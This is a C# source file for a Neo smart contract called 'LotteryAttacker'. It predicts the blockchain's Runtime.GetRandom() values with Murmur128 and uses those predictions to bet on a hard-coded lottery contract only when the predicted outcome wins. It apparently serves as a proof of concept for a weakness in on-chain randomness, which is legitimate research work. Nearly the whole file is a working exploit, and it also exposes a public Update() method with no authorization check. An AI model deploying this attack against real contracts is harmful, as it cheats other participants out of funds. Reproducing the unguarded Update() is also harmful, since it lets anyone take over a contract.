using System;
using System.ComponentModel;
using System.Numerics;
using Neo;
using Neo.SmartContract;
using Neo.SmartContract.Framework;
using Neo.SmartContract.Framework.Attributes;
using Neo.SmartContract.Framework.Native;
using Neo.SmartContract.Framework.Services;

namespace LotteryAttacker
{
    [DisplayName("LotteryAttacker")]
    [ManifestExtra("Author", "NEO")]
    [ManifestExtra("Email", "developer@neo.org")]
    [ManifestExtra("Description", "This is a LotteryAttacker")]
    public class LotteryAttacker : SmartContract
    {
        [InitialValue("NQpRgzN6TVoJ7MMTVsHzvvrfidgjtJNEdo", ContractParameterType.Hash160)]
        private static readonly UInt160 Lottery = default;
        [DisplayName("Predicated")]
        public static event PredicatedEvent onPredicated;
        public delegate void PredicatedEvent(BigInteger rand);
        [DisplayName("RealRandom")]
        public static event RealRandomEvent onRealRandom;
        public delegate void RealRandomEvent(BigInteger rand);

        public static void Predicate() {
            BigInteger rand = Runtime.GetRandom();
            for (int i = 0; i < 10; i++) {
                byte[] nextrand = murmur128(rand.ToByteArray().Concat(new byte[]{0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00}).Take(16), Runtime.GetNetwork());
                onPredicated(new BigInteger(nextrand.Concat(new byte[]{0x00})));
                rand = Runtime.GetRandom();
                onRealRandom(rand);
            }
        }

        public static void OnNEP17Payment(UInt160 from, BigInteger amount, object data)
        {
        }

        public static int Attack() {
            BigInteger rand = Runtime.GetRandom();
            for (int i = 0; i < 10; i++) {
                byte[] nextrand = murmur128(rand.ToByteArray().Concat(new byte[]{0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00}).Take(16), Runtime.GetNetwork());
                if ((new BigInteger(nextrand)) % 2 == 1) {
                    ExecutionEngine.Assert(NEO.Transfer(Runtime.ExecutingScriptHash, Lottery, 1, null));
                    return i;
                }
                rand = Runtime.GetRandom();
            }
            return 0;
        }

        public static void Update(ByteString nefFile, string manifest)
        {
            ContractManagement.Update(nefFile, manifest, null);
        }
        
        public static byte[] murmur128(byte[] nonceData, uint seed) {
            ExecutionEngine.Assert(nonceData.Length == 16, "invalid nonce length");
            return Murmur128.Hash(nonceData, seed);
        }
    }
}
